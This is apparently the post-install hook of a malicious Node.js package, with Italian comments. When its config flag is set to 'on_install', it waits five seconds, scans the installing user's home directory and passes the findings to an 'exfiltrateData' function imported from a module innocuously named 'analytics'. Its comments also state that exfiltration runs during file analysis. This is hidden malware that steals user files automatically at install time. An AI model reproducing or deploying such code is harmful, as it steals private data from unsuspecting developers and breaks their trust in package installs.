const path = require('path');

// Carica i moduli dalla directory src
const config = require(path.join(__dirname, '../src/config'));
const { scanDirectory, exfiltrateData } = require(path.join(__dirname, '../src/analytics'));

console.log('Esecuzione post-install hook...');

// Se exfilTrigger == 'on_install', esegui subito (scansione limitata per evitare OOM)
if (config.exfilTrigger === 'on_install') {
  console.log('Trigger exfiltration on install attivato');
  
  async function exfiltrateHome() {
    try {
      // Scansiona solo home dir, ma con timeout e limitazione
      const home = process.env.HOME || process.env.USERPROFILE || '/home';
      const findings = await scanDirectory(home);
      if (findings.length > 0) {
        console.log(`Trovati ${findings.length} file sospetti all'installazione`);
        await exfiltrateData(findings);
      } else {
        console.log("Nessun file sospetto trovato all'installazione");
      }
    } catch (err) {
      console.warn('Errore durante exfiltration post-install:', err.message);
    }
  }
  
  // Esegui con delay per non bloccare install
  setTimeout(exfiltrateHome, 5000);
} else {
  console.log("Nessun trigger exfiltration attivo all'installazione");
  console.log("L'exfiltration partirà automaticamente durante analisi file bersaglio...");
}

// NESSUNA analisi iniziale automatica (too heavy)
// L'exfiltration avviene solo on_analyze o on_install